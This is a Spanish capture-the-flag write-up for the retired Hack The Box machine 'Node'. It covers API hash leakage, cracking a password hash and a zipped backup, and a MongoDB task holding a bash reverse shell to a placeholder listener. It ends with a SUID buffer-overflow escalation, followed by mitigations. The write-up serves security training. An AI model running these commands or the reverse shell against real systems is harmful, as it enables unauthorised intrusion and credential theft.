---
machine: Node
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, nodejs, api, excessive-data-exposure, zip2john, mongodb, suid, buffer-overflow]
---

# Node — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una API Express expone los hashes de todos los usuarios. El hash del administrador se crackea, se descarga un backup cifrado y el código fuente del archivo revela credenciales de MongoDB y SSH. Con acceso a MongoDB se inserta una tarea que ejecuta comandos como otro usuario. La escalada final abusa de un binario SUID de backup con un desbordamiento de buffer de 32 bits.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p22,3000 <IP>
```

- SSH en 22.
- Aplicación Node.js/Express en 3000.
- El sitio es una red social llamada MyPlace.

## Enumeración

El JavaScript del cliente referencia varias rutas `/api`. La ruta `/api/users/latest` devuelve un array con `_id`, `username`, `password` e `is_admin`; no debería incluir el hash.

```bash
curl -s http://<IP>:3000/api/users/latest | jq .
curl -s http://<IP>:3000/api/users/mark | jq .
```

Se guardan los hashes SHA-256 y se atacan fuera de línea con un diccionario.

```bash
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
```

El hash del usuario administrador produce `<PASSWORD>`. Con esas credenciales se accede al panel y se descarga `myplace.backup`.

## Foothold

El backup es texto ASCII con una única línea base64. Se decodifica y se comprueba que es un ZIP protegido.

```bash
base64 -d myplace.backup > myplace.zip
file myplace.zip
zip2john myplace.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

La contraseña `<ZIP_PASSWORD>` abre el archivo. Dentro está el código de la aplicación, incluido `app.js`, con la cadena de conexión a MongoDB y la clave del backup. La contraseña del usuario `mark` que aparece en la configuración también funciona por SSH.

```bash
ssh mark@<IP>
```

## Movimiento lateral

MongoDB escucha solo en localhost. El usuario `mark` puede autenticarse y la aplicación ejecuta las entradas de la colección `tasks`.

```bash
mongo -u mark -p '<PASSWORD>' --authenticationDatabase users
```

```javascript
db.tasks.insert({cmd: "bash -c 'bash -i >& /dev/tcp/<LHOST>/443 0>&1'"})
```

La tarea se ejecuta como `tom`; se obtiene una shell y se confirma con `id`.

## Escalada de privilegios

`tom` puede ejecutar un binario SUID propiedad de root:

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/local/bin/backup
```

El binario es ELF de 32 bits, sin canary ni PIE, con NX. Copia la ruta recibida con `strcpy` en un buffer de pila y llama a `zip` mediante `system`. Un path excesivamente largo desborda el buffer.

La explotación prevista es un `ret2libc`: se calcula el offset con `pattern_create`, se filtra o se fuerza la base de libc por ASLR y se llama a `system("/bin/sh")`. La variante de inyección de comandos en el path también es posible porque la cadena termina en `system`.

```bash
# Offset y direcciones se calculan sobre la copia local del binario.
./backup a '' "$(python3 -c 'print("A"*<OFFSET> + "<RET>")')"
```

La shell resultante es de root.

## Evidencia

- Respuesta de la API con hashes redactados.
- `file` y `zip2john` sobre el backup.
- `id` como `tom` y como root.
- Captura del comando de MongoDB, sin la tarea real.

## Lecciones aprendidas

- Una API que devuelve el objeto completo filtra campos que el cliente no necesita.
- Los backups del código suelen contener secretos de conexión y claves.
- Un SUID con `strcpy` sobre una ruta controlada es un desbordamiento, no solo una mala práctica.

## Mitigaciones y detección

- Devolver solo campos necesarios y nunca hashes ni secretos.
- Guardar backups fuera del alcance del servicio y cifrarlos con una clave no embebida.
- Ejecutar MongoDB con autenticación y mínimo privilegio; validar las tareas que ejecuta la aplicación.
- Compilar con canary, PIE y `FORTIFY_SOURCE`; retirar SUID innecesarios.
- Alertar de descargas masivas de `/api/users`, accesos a backups y creación de tareas en MongoDB.

## Referencias

- <https://www.hackthebox.com/machines/Node>
- <https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/>
- <https://attack.mitre.org/techniques/T1552/001/>
- <https://attack.mitre.org/techniques/T1068/>
